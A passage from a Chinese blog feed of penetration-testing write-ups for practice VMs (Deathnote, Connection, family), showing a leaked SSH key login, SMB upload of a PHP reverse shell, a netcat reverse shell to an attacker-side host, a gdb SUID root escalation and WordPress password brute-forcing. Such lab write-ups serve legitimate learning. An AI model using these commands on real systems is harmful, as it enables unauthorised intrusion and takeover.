class="symbol">/6vBi+wMyFF3</span></span><br><span class="line">jQhP4Su72ssLH1n<span class="symbol">/E2HBimD0F75mi6LE9SNuI6NivbJUWZFrfbQhN2FSsIHnuoLIJQfuFZ</span></span><br><span class="line">sQtJsBQ9d3yvTD2k<span class="symbol">/POyhURC6MW0V/aQICFZ6zAAAAAwEAAQAAAQEAn0yfj1GougtNRE/v</span></span><br><span class="line">RyHb3QUW8fMIQFs7j6zsrZx8dHIErxEdoQJz1MdymD2fpzFl9lCosOejNOyow0W0yL6aJ1</span><br><span class="line"><span class="number">67</span>OXMMcP0Kq19wO<span class="operator">+</span>KsDEB1VBxGKR<span class="symbol">/LeyG3CiXq9n6jUJL/BCAaPyc0EbjlxL+bv2TnQBpa</span></span><br><span class="line">emhcQiuCqRHoFIoQAkOqSo7ylyy5trn0aShCUur47VCfb6h<span class="symbol">/bZPkG+n1am9ZM9P5PJ4LwK</span></span><br><span class="line">EFdKPJwXvaKvXUZOysKauwRxVpHQvlYR1WtvHj51Xb8iTyIFcGGUk<span class="operator">+</span>e0GpxTgaru<span class="symbol">/e3e8l</span></span><br><span class="line">Pd09G6ln8XgvzoLP6axaf8s39x3b4T0bVMVwVMs6j6V08QAAAIB3jZQ0VvKwJF7rimibzY</span><br><span class="line">ha7YVcYPKiLfjlC2hEe3wh5af0CvMtq7VvjkmNKFbBGZ41NtRjNRylPtNKn1HA9UI8pUXN</span><br><span class="line">KeKFpmmn6IeszRm86eFmGXB5rnsan<span class="symbol">/M2Mr3qfIOI9Xpiv0XML8idtSxOBC91rx269BHb2h</span></span><br><span class="line"><span class="number">6</span>QGsYXA<span class="symbol">/fhjQAAAIEA/mrWAdzdukdspQuoBRYWgBg1HjW38fn/CXvwHlx+3u61RRTmXLBl</span></span><br><span class="line">badAoyC5flrOzdubDdozp<span class="operator">+</span>p7n4mGBmRI8CPxhyrTKDduVb0TpH1M7NWboYazhqwm6j1Fki</span><br><span class="line">mBM<span class="symbol">/WOeLxM5VvUAN31jETQajjyDyx0Oo1PDy4NKBJ6I22LHUsAAACBAPQLrb05ptUGPdHC</span></span><br><span class="line">CLpY3Go52IpEjW<span class="operator">+</span>HjP60KQCkyGPBzSJeVbRE5yT7wBIevTIzk7OW1V3Kzx0816X116w4dz</span><br><span class="line"><span class="number">44</span>OmPP8lcu4JTrRmNEO6ptX7dI4BrfbpA49hLsG1<span class="symbol">/QWuP/QkrE/+aiKEU2mtxOAkj72zJ2</span></span><br><span class="line">KHY9pOWV1D9Uwas5AAAAC2xAZGVhdGhub3RlAQIDBAUGBw<span class="operator">==</span></span><br><span class="line"><span class="operator">-</span>----END OPENSSH PRIVATE KEY-----</span><br><span class="line">l@deathnote:~<span class="operator">/</span>.ssh$ ssh kira@<span class="number">192.168</span>.<span class="number">179.40</span> <span class="operator">-</span>i id_rsa</span><br><span class="line">The authenticity of host &#x27;<span class="number">192.168</span>.<span class="number">179.40</span> (<span class="number">192.168</span>.<span class="number">179.40</span>)&#x27; can&#x27;t be established.</span><br><span class="line">ECDSA key fingerprint is SHA256:IT1oaQY12jhOmyoQGZC1hKHtYUWy6i8rET2yKX0KkpI.</span><br><span class="line">Are you sure you want to continue connecting (yes<span class="operator">/</span>no)<span class="operator">?</span> yes</span><br><span class="line"><span class="params">Warning:</span> Permanently added &#x27;<span class="number">192.168</span>.<span class="number">179.40</span>&#x27; (ECDSA) to the list of known hosts.</span><br><span class="line">Linux deathnote <span class="number">4.19</span>.<span class="number">0</span><span class="operator">-</span><span class="number">1</span>7-amd64 <span class="comment">#1 SMP Debian 4.19.194-2 (2021-06-21) x86_64</span></span><br><span class="line"></span><br><span class="line">The programs included <span class="keyword">with</span> the Debian GNU<span class="symbol">/Linux</span> system are free software;</span><br><span class="line">the exact distribution terms for each program are described <span class="keyword">in</span> the</span><br><span class="line">individual files <span class="keyword">in</span> <span class="operator">/</span>usr<span class="operator">/</span>share<span class="operator">/</span>doc<span class="comment">/*/copyright.</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span></span><br><span class="line"><span class="comment">permitted by applicable law.</span></span><br><span class="line"><span class="comment">Last login: Sat Sep  4 06:00:09 2021 from 127.0.0.1</span></span><br><span class="line"><span class="comment">kira@deathnote:~$ </span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure></div>
<p>然后通过kira.txt这个内容，也能找到&#x2F;opt&#x2F;L这个文件然后得到kira密码，继续下面操作</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">kira<span class="variable">@deathnote</span><span class="symbol">:~</span><span class="variable">$ </span>ls</span><br><span class="line">kira.txt</span><br><span class="line">kira<span class="variable">@deathnote</span><span class="symbol">:~</span><span class="variable">$ </span>cat kira.txt </span><br><span class="line">cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp</span><br><span class="line">kira<span class="variable">@deathnote</span><span class="symbol">:~</span><span class="variable">$ </span>echo <span class="string">&quot;cGxlYXNlIHByb3RlY3Qgb25lIG9mIHRoZSBmb2xsb3dpbmcgCjEuIEwgKC9vcHQpCjIuIE1pc2EgKC92YXIp&quot;</span> | base64 -d</span><br><span class="line">please protect one of the following </span><br><span class="line"><span class="number">1</span>. L (/opt)</span><br><span class="line"><span class="number">2</span>. <span class="title class_">Misa</span> (/var)kira<span class="variable">@deathnote</span><span class="symbol">:~</span><span class="variable">$ </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">kira<span class="variable">@deathnote</span><span class="symbol">:~</span><span class="variable">$ </span>sudo -l</span><br><span class="line">[sudo] password <span class="keyword">for</span> <span class="symbol">kira:</span> </span><br><span class="line"><span class="title class_">Matching</span> <span class="title class_">Defaults</span> entries <span class="keyword">for</span> kira on <span class="symbol">deathnote:</span></span><br><span class="line">    env_reset, mail_badpass, secure_path=/usr/local/sbin\<span class="symbol">:/usr/local/bin</span>\<span class="symbol">:/usr/sbin</span>\<span class="symbol">:/usr/bin</span>\<span class="symbol">:/sbin</span>\<span class="symbol">:/bin</span></span><br><span class="line"></span><br><span class="line"><span class="title class_">User</span> kira may run the following commands on <span class="symbol">deathnote:</span></span><br><span class="line">    (<span class="title class_">ALL</span> : <span class="title class_">ALL</span>) <span class="title class_">ALL</span></span><br><span class="line">kira<span class="variable">@deathnote</span><span class="symbol">:~</span><span class="variable">$ </span>su - root</span><br><span class="line"><span class="symbol">Password:</span> </span><br><span class="line"><span class="symbol">su:</span> <span class="title class_">Authentication</span> failure</span><br><span class="line">kira<span class="variable">@deathnote</span><span class="symbol">:~</span><span class="variable">$ </span>sudo /bin/bash</span><br><span class="line">root<span class="variable">@deathnote</span><span class="symbol">:/home/kira</span><span class="comment"># id</span></span><br><span class="line">uid=<span class="number">0</span>(root) gid=<span class="number">0</span>(root) groups=<span class="number">0</span>(root)</span><br><span class="line">root<span class="variable">@deathnote</span><span class="symbol">:/home/kira</span><span class="comment"># </span></span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>这就是kami吗，能有任何的权限，<br><img src="https://pic1.imgdb.cn/item/67aad4a0d0e0a243d4fe42a5.png"><br><img src="https://pic1.imgdb.cn/item/67aad4dbd0e0a243d4fe42ab.png"><br>特地找出名场面哈哈哈，这个番真的超级好看无敌推荐</p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>vulnhub</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>vulnhub</tag>
        <tag>靶场</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-Connection</title>
    <url>/posts/10052.html</url>
    <content><![CDATA[<p>HMV-Connection靶场复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/679a35f7d0e0a243d4f878cd.png"></p>
<h1 id="Connection"><a href="#Connection" class="headerlink" title="Connection"></a>Connection</h1><p>无法获取ip 在开始之前要先进入拯救者模式中修改 网卡信息</p>
<h2 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h2><p><img src="https://pic1.imgdb.cn/item/679a3d3bd0e0a243d4f879fa.png" alt="|750"><br>端口有4个  有http  ssh 还有smb服务 这个服务刚学到 是一个文件共享的服务 </p>
<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>这里主要先考虑http和22端口<br>用dirsearch发现没有其他有用的界面   80端口是一个默认的index界面没有有用的信息<br>ssh 也不能直接登录上去  需要密码<br>所以考虑这个smb服务<br>用enum4linux -S 列举出smb共享资源<br><img src="https://pic1.imgdb.cn/item/679a3d40d0e0a243d4f879fb.png"><br>登录到share    – 利用smbclient  -N  匿名登录  <code>smbclient -N \\\\192.168.240.237\\share</code><br>这里要用反斜杠转义<br><img src="https://pic1.imgdb.cn/item/679a3d43d0e0a243d4f879fe.png"><br>登录进来之后也只看到只有一个html文件     然后我们从本地上传一个反弹shell的文件<br><code>put php-reverse-shell.php</code>  因为share这个文件夹只有只读权限所以进到html中上传<br>上传成功后 在本地监听  web端进入这个php文件  然后就可以获得shell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ROUTEROS"><figure class="iseeu highlight /routeros"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/connections]</span><br><span class="line">└─# nc -lp 1234</span><br><span class="line">Linux<span class="built_in"> connection </span>4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU/Linux</span><br><span class="line"> 07:18:55 up 23 min,  0 users,  load average: 0.00, 0.00, 0.00<span class="built_in"></span></span><br><span class="line"><span class="built_in">USER </span>    TTY      <span class="keyword">FROM</span>             LOGIN@   IDLE   JCPU   PCPU WHAT</span><br><span class="line"><span class="attribute">uid</span>=33(www-data) <span class="attribute">gid</span>=33(www-data) <span class="attribute">groups</span>=33(www-data)</span><br><span class="line">/bin/sh: 0: can<span class="string">&#x27;t access tty; job control turned off</span></span><br><span class="line"><span class="string">$ id</span></span><br><span class="line"><span class="string">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span></span><br><span class="line"><span class="string">$ clear</span></span><br><span class="line"><span class="string">TERM environment variable not set.</span></span><br><span class="line"><span class="string">$ python -c &quot;import pty;pty.spawn(&#x27;</span>/bin/bash<span class="string">&#x27;)&quot;</span></span><br></pre></td></tr></table></figure></div>
<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>用suid提权<br><img src="https://pic1.imgdb.cn/item/679a3d43d0e0a243d4f879ff.png" alt="|500"><br>这里使用gdb提权<br>在<a href="https://gtfobins.github.io/gtfobins/gdb/">gtfobins</a> 中找到提权方案</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line"><span class="symbol">/usr/bin/gdb</span> <span class="operator">-</span>nx <span class="operator">-</span>ex &#x27;python <span class="built_in">import</span> os; os.execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;bash&quot;</span>, <span class="string">&quot;-p&quot;</span>)&#x27; <span class="operator">-</span>ex quit</span><br></pre></td></tr></table></figure></div>
<p>拿到root权限<br>分别在&#x2F;root 和&#x2F;home&#x2F;connection 中找到flag</p>
<h3 id="解释-gdb-命令"><a href="#解释-gdb-命令" class="headerlink" title="解释 gdb 命令"></a>解释 <code>gdb</code> 命令</h3><h2 id="1-usr-bin-gdb"><a href="#1-usr-bin-gdb" class="headerlink" title="1. /usr/bin/gdb"></a>1. <code>/usr/bin/gdb</code></h2><ul>
<li><strong>作用</strong>：这是 <code>gdb</code> 命令的完整路径，表示调用的是系统中的 GNU 调试器（GDB）。<code>gdb</code> 是一个强大的调试工具，通常用于调试程序，也能执行低级操作，如调用系统命令或执行特定代码。</li>
</ul>
<h2 id="2-nx"><a href="#2-nx" class="headerlink" title="2. -nx"></a>2. <code>-nx</code></h2><ul>
<li><strong><code>-n</code></strong>：启动时不执行任何初始化文件（如 <code>.gdbinit</code>），避免加载默认设置或用户配置文件。</li>
<li><strong><code>-x</code></strong>：指定 <code>gdb</code> 执行的脚本文件，但在此命令中使用 <code>-ex</code> 代替，执行内联命令。</li>
</ul>
<h2 id="3-ex-python-import-os-os-execl-bin-bash-bash-p"><a href="#3-ex-python-import-os-os-execl-bin-bash-bash-p" class="headerlink" title="3. -ex &#39;python import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)&#39;"></a>3. <code>-ex &#39;python import os; os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)&#39;</code></h2><ul>
<li><strong><code>-ex</code></strong>：用于执行 <code>gdb</code> 启动时要运行的命令，支持多次使用。</li>
<li><strong>Python 脚本</strong>：<ul>
<li><strong><code>import os</code></strong>：导入 <code>os</code> 模块，用于与操作系统交互。</li>
<li><strong><code>os.execl(&quot;/bin/bash&quot;, &quot;bash&quot;, &quot;-p&quot;)</code></strong>：用 <code>execl</code> 替换当前进程（<code>gdb</code>）为新的进程，即启动 <code>bash</code> shell。<ul>
<li><strong><code>/bin/bash</code></strong>：指定执行的程序，即 <code>bash</code> shell。</li>
<li><strong><code>&quot;bash&quot;</code></strong>：传递给 <code>bash</code> 的参数，第一个参数通常是执行命令本身。</li>
<li><strong><code>&quot;-p&quot;</code></strong>：让 <code>bash</code> 保持 <code>root</code> 权限，如果 <code>gdb</code> 以 <code>root</code> 权限运行，新启动的 <code>bash</code> shell 也会保持 <code>root</code> 权限。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="4-ex-quit"><a href="#4-ex-quit" class="headerlink" title="4. -ex quit"></a>4. <code>-ex quit</code></h2><ul>
<li><strong>作用</strong>：在执行完上述 Python 脚本后，立即退出 <code>gdb</code>。<code>gdb</code> 执行完命令后会退出，但新启动的 <code>bash</code> shell 会继续运行。</li>
</ul>
]]></content>
      <categories>
        <category>靶场</category>
        <category>hmv</category>
      </categories>
      <tags>
        <tag>渗透</tag>
        <tag>靶场</tag>
        <tag>HMV</tag>
      </tags>
  </entry>
  <entry>
    <title>HMV-family</title>
    <url>/posts/9478.html</url>
    <content><![CDATA[<p>HMV-family靶机复盘</p>
<span id="more"></span>
<p><img src="https://pic1.imgdb.cn/item/67ad5a9fd0e0a243d4feb932.png"></p>
<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="NIX"><figure class="iseeu highlight /nix"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~<span class="operator">/</span>tmp]</span><br><span class="line">└─<span class="comment"># nmap -A 192.168.112.12  </span></span><br><span class="line">Starting Nmap <span class="number">7.95</span> ( https:<span class="symbol">//nmap.org</span> ) at <span class="number">202</span>5-<span class="number">0</span>2-<span class="number">13</span> <span class="number">10</span>:<span class="number">41</span> CST</span><br><span class="line">Nmap scan report for <span class="number">192.168</span>.<span class="number">112.12</span> (<span class="number">192.168</span>.<span class="number">112.12</span>)</span><br><span class="line">Host is up (<span class="number">0.0024</span>s latency).</span><br><span class="line">Not <span class="params">shown:</span> <span class="number">998</span> closed tcp ports (reset)</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line"><span class="number">22</span><span class="symbol">/tcp</span> open  ssh     OpenSSH <span class="number">7.9</span>p1 Debian <span class="number">10</span><span class="operator">+</span>deb10u2 (protocol <span class="number">2.0</span>)</span><br><span class="line">| <span class="params">ssh-hostkey:</span> </span><br><span class="line">|   <span class="number">2048</span> <span class="number">0</span>d:<span class="number">4</span>e:fd:<span class="number">57</span>:<span class="number">05</span>:<span class="number">8</span>f:d0:d6:<span class="number">1</span>d:<span class="number">67</span>:<span class="number">5</span>d:<span class="number">6</span>d:<span class="number">4</span>e:b5:c9:fc (RSA)</span><br><span class="line">|   <span class="number">256</span> d4:<span class="number">98</span>:fb:a7:<span class="number">94</span>:bd:<span class="number">0</span>c:c6:a8:<span class="number">60</span>:<span class="number">5</span>b:bc:b9:c7:f4:<span class="number">51</span> (ECDSA)</span><br><span class="line">|_  <span class="number">256</span> fa:<span class="number">34</span>:<span class="number">3</span>a:<span class="number">25</span>:<span class="number">74</span>:<span class="number">40</span>:<span class="number">99</span>:fc:<span class="number">4</span>f:<span class="number">60</span>:be:db:<span class="number">7</span>e:<span class="number">7</span>f:<span class="number">93</span>:be (ED25519)</span><br><span class="line"><span class="number">80</span><span class="symbol">/tcp</span> open  http    Apache httpd <span class="number">2.4</span>.<span class="number">38</span></span><br><span class="line">|<span class="params">_http-title:</span> Index of <span class="symbol">/</span></span><br><span class="line">| <span class="params">http-ls:</span> Volume <span class="symbol">/</span></span><br><span class="line">| SIZE  TIME              FILENAME</span><br><span class="line">| <span class="operator">-</span>     <span class="number">202</span>0-<span class="number">0</span>2-<span class="number">06</span> <span class="number">07</span>:<span class="number">33</span>  wordpress<span class="symbol">/</span></span><br><span class="line">|_</span><br><span class="line">|<span class="params">_http-server-header:</span> Apache<span class="symbol">/2.4.38</span> (Debian)</span><br><span class="line">MAC <span class="params">Address:</span> <span class="number">06</span>:<span class="number">66</span>:FC:<span class="number">0</span>B:B7:E2 (Unknown)</span><br><span class="line">Device <span class="params">type:</span> general purpose|router</span><br><span class="line"><span class="params">Running:</span> Linux <span class="number">4</span>.X|<span class="number">5</span>.X, MikroTik RouterOS <span class="number">7</span>.X</span><br><span class="line">OS <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">4</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5</span> cpe:<span class="operator">/</span>o:mikrotik:routeros:<span class="number">7</span> cpe:<span class="operator">/</span>o:linux:linux_kernel:<span class="number">5.6</span>.<span class="number">3</span></span><br><span class="line">OS <span class="params">details:</span> Linux <span class="number">4.15</span> <span class="operator">-</span> <span class="number">5.19</span>, OpenWrt <span class="number">21.02</span> (Linux <span class="number">5.4</span>), MikroTik RouterOS <span class="number">7.2</span> <span class="operator">-</span> <span class="number">7.5</span> (Linux <span class="number">5.6</span>.<span class="number">3</span>)</span><br><span class="line">Network <span class="params">Distance:</span> <span class="number">1</span> hop</span><br><span class="line">Service <span class="params">Info:</span> <span class="params">Host:</span> <span class="number">127.0</span>.<span class="number">1.1</span>; <span class="params">OS:</span> Linux; <span class="params">CPE:</span> cpe:<span class="operator">/</span>o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line"><span class="number">1</span>   <span class="number">2.38</span> ms <span class="number">192.168</span>.<span class="number">112.12</span> (<span class="number">192.168</span>.<span class="number">112.12</span>)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https:<span class="operator">//</span>nmap.org<span class="operator">/</span>submit<span class="symbol">/</span> .</span><br><span class="line">Nmap <span class="params">done:</span> <span class="number">1</span> IP address (<span class="number">1</span> host up) scanned <span class="keyword">in</span> <span class="number">12.44</span> seconds</span><br></pre></td></tr></table></figure></div>
<p>开放80 和 22端口，而且80端口是wordpress</p>
<h1 id="web探测"><a href="#web探测" class="headerlink" title="web探测"></a>web探测</h1><p>直接访问web端，有一个文件夹，点开内容：<br><img src="https://pic1.imgdb.cn/item/67ad5c66d0e0a243d4feb98a.png"><br>但是用wpscan直接扫描说这个站点不是wordpress，但是我提交这个输入框的时候跳转的页面的url变了，所以我们这里修改hosts文件<br>修改之后就可以正常进入wordpress的登录界面了，默认都在&#x2F;wp-admin<br><img src="https://pic1.imgdb.cn/item/67ad61b5d0e0a243d4febad7.png"><br>然后用bp抓包，指定用户名为<code>admin</code>爆破密码<br>得到密码 <code>phantom</code><br><img src="https://pic1.imgdb.cn/item/67ad6b79d0e0a243d4febf91.png"><br>成功进入wordpress界面<br><img src="https://pic1.imgdb.cn/item/67ad6f5ed0e0a243d4fec0b3.png"><br>接着安装WPTerm插件，让他可以执行shell指令 <a href="https://wordpress.org/plugins/wpterm/">https://wordpress.org/plugins/wpterm/</a><br>在工具这就能找到这个插件<br><img src="https://pic1.imgdb.cn/item/67ad7384d0e0a243d4fec1b4.png"><br><code> nc 192.168.112.83 1234 -e /bin/bash</code>输入反弹shell指令，成功得到www-datashell</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># nc -lp 1234                </span></span><br><span class="line">id</span><br><span class="line">uid=<span class="number">33</span>(www-data) gid=<span class="number">33</span>(www-data) groups=<span class="number">33</span>(www-data)</span><br><span class="line">script -qc /bin/bash /dev/null</span><br><span class="line">www-data<span class="variable">@family</span><span class="symbol">:/var/www/html/wordpress</span><span class="variable">$ </span>stty raw -echo; fg</span><br><span class="line">stty raw -echo; fg</span><br><span class="line"><span class="symbol">bash:</span> <span class="symbol">fg:</span> <span class="symbol">current:</span> no such job</span><br><span class="line">www-data<span class="variable">@family</span><span class="symbol">:/var/www/html/wordpress</span><span class="variable">$ </span>^Z</span><br><span class="line"><span class="symbol">zsh:</span> suspended  nc -lp <span class="number">1234</span></span><br><span class="line">                                                                                                                   </span><br><span class="line">┌──(root㉿kakeru)-[~/tmp]</span><br><span class="line">└─<span class="comment"># stty raw -echo; fg</span></span><br><span class="line">[<span class="number">1</span>]  + continued  nc -lp <span class="number">1234</span></span><br><span class="line">                             <span class="symbol">reset:</span> unknown terminal type unknown</span><br><span class="line"><span class="title class_">Terminal</span> type? xterm</span><br></pre></td></tr></table></figure></div>

<h1 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h1><p>去家目录看到一共有三个用户</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ELIXIR"><figure class="iseeu highlight /elixir"><table><tr><td class="code"><pre><span class="line">www-data<span class="variable">@family</span><span class="symbol">:/var/www/html/wordpress</span><span class="variable">$ </span>ls /home</span><br><span class="line">baby  father  mother</span><br></pre></td></tr></table></figure></div>
<p>可以找到www用户的历史记录</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="BASH"><figure class="iseeu highlight /bash"><table><tr><td class="code"><pre><span class="line">www-data@family:/var/www$ <span class="built_in">cat</span> .bash_history </span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">cd</span> /home</span><br><span class="line"><span class="built_in">ls</span></span><br><span class="line"><span class="built_in">cd</span> baby</span><br><span class="line"><span class="built_in">cd</span> mother</span><br><span class="line"><span class="built_in">cd</span> father</span><br><span class="line">clear</span><br><span class="line">find / -group www-data -<span class="built_in">type</span> f 2&gt;/dev/null | grep -v /var/www</span><br><span class="line">find / -group www-data -<span class="built_in">type</span> f 2&gt;/dev/null | grep -v -E <span class="string">&quot;/var/www|proc&quot;</span></span><br><span class="line"><span class="built_in">cat</span> /usr/share/perl/5.28.1/perso.txt</span><br><span class="line"><span class="built_in">ls</span> -l /usr/share/perl/5.28.1/perso.txt</span><br><span class="line">su - father</span><br><span class="line"><span class="built_in">export</span> TERM=xterm</span><br><span class="line">clear</span><br><span class="line"><span class="built_in">sudo</span> -l</span><br><span class="line"></span><br><span class="line">www-data@family:/var/www$ <span class="built_in">cat</span> /usr/share/perl/5.28.1/perso.txt</span><br><span class="line">uncrackablepassword</span><br></pre></td></tr></table></figure></div>
<p>发现有一个可疑的文件，他访问过这个文件之后就切换到father用户了<br>我们用这个密码尝试之后，果然可以切换到father用户</p>
<h2 id="father"><a href="#father" class="headerlink" title="father"></a>father</h2><p>他的目录下面什么都没有,没有sudo 没有suid，下一步从本机下载pspy64看看定时任务</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="ACCESSLOG"><figure class="iseeu highlight /accesslog"><table><tr><td class="code"><pre><span class="line">┌──(root㉿kakeru)-<span class="string">[~/tmp]</span></span><br><span class="line">└─# python3 -m http.server <span class="number">80</span></span><br><span class="line">Serving HTTP on <span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span> port <span class="number">80</span> (http://<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>.<span class="number">0</span>:<span class="number">80</span>/) ...</span><br><span class="line"><span class="number">192.168.112.12</span> - - <span class="string">[13/Feb/2025 12:52:51]</span> <span class="string">&quot;<span class="keyword">GET</span> /pspy64 HTTP/1.1&quot;</span> <span class="number">200</span> -</span><br><span class="line"></span><br><span class="line">father@family:~$ wget <span class="number">192</span>.<span class="number">168</span>.<span class="number">112</span>.<span class="number">83</span>/pspy64</span><br><span class="line">--<span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">05</span>:<span class="number">52</span>:<span class="number">50</span>--  http://<span class="number">192</span>.<span class="number">168</span>.<span class="number">112</span>.<span class="number">83</span>/pspy64</span><br><span class="line">Connecting to <span class="number">192</span>.<span class="number">168</span>.<span class="number">112</span>.<span class="number">83</span>:<span class="number">80</span>... connected.</span><br><span class="line">HTTP request sent, awaiting response... <span class="number">200</span> OK</span><br><span class="line">Length: <span class="number">3104768</span> (<span class="number">3</span>.0M) <span class="string">[application/octet-stream]</span></span><br><span class="line">Saving to: ‘pspy64’</span><br><span class="line"></span><br><span class="line">pspy64                       <span class="number">100</span>%<span class="string">[=============================================&gt;]</span>   <span class="number">2</span>.96M  --.-KB/s    in <span class="number">0</span>.09s   </span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>-<span class="number">02</span>-<span class="number">13</span> <span class="number">05</span>:<span class="number">52</span>:<span class="number">51</span> (<span class="number">33</span>.<span class="number">1</span> MB/s) - ‘pspy64’ saved <span class="string">[3104768/3104768]</span></span><br><span class="line"></span><br><span class="line">father@family:~$ chmod +x pspy64</span><br><span class="line">father@family:~$ ./pspy64</span><br><span class="line"></span><br><span class="line"><span class="number">2025</span>/<span class="number">02</span>/<span class="number">13</span> <span class="number">05</span>:<span class="number">54</span>:<span class="number">01</span> CMD: UID=<span class="number">1001</span>  PID=<span class="number">963</span>    | /bin/sh -c python ~/check.py </span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
<p>可以看到uid为1001的用户定时执行他的家目录下面的check.py文件<br>从&#x2F;etc&#x2F;passwd中能找到1001是mother</p>
<div class="highlight-wrap"autocomplete="off" autocorrect="off" autocapitalize="off" spellcheck="false" contenteditable="true"data-rel="RUBY"><figure class="iseeu highlight /ruby"><table><tr><td class="code"><pre><span class="line">father<span class="variable">@family</span><span class="symbol">:/home</span><span class="variable">$ </span>cat /etc/passwd</span><br><span class="line"><span class="symbol">root:</span><span class="symbol">x:</span><span class="number">0</span><span class="symbol">:</span><span class="number">0</span><span class="symbol">:root</span><span class="symbol">:/root</span><span class="symbol">:/bin/bash</span></span><br><span class="line"><span class="symbol">daemon:</span><span class="symbol">x:</span><span class="number">1</span><span class="symbol">:</span><span class="number">1</span><span class="symbol">:daemon</span><span class="symbol">:/usr/sbin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">bin:</span><span class="symbol">x:</span><span class="number">2</span><span class="symbol">:</span><span class="number">2</span><span class="symbol">:bin</span><span class="symbol">:/bin</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sys:</span><span class="symbol">x:</span><span class="number">3</span><span class="symbol">:</span><span class="number">3</span><span class="symbol">:sys</span><span class="symbol">:/dev</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">sync:</span><span class="symbol">x:</span><span class="number">4</span><span class="symbol">:</span><span class="number">65534</span><span class="symbol">:sync</span><span class="symbol">:/bin</span><span class="symbol">:/bin/sync</span></span><br><span class="line"><span class="symbol">games:</span><span class="symbol">x:</span><span class="number">5</span><span class="symbol">:</span><span class="number">60</span><span class="symbol">:games</span><span class="symbol">:/usr/games</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">man:</span><span class="symbol">x:</span><span class="number">6</span><span class="symbol">:</span><span class="number">12</span><span class="symbol">:man</span><span class="symbol">:/var/cache/man</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">lp:</span><span class="symbol">x:</span><span class="number">7</span><span class="symbol">:</span><span class="number">7</span><span class="symbol">:lp</span><span class="symbol">:/var/spool/lpd</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">mail:</span><span class="symbol">x:</span><span class="number">8</span><span class="symbol">:</span><span class="number">8</span><span class="symbol">:mail</span><span class="symbol">:/var/mail</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">news:</span><span class="symbol">x:</span><span class="number">9</span><span class="symbol">:</span><span class="number">9</span><span class="symbol">:news</span><span class="symbol">:/var/spool/news</span><span class="symbol">:/usr/sbin/nologin</span></span><br><span class="line"><span class="symbol">uucp:</span><span class="symbol">x:</span><span class="number">10</span><span class="symbol">:</span><span class="number">10</span><span 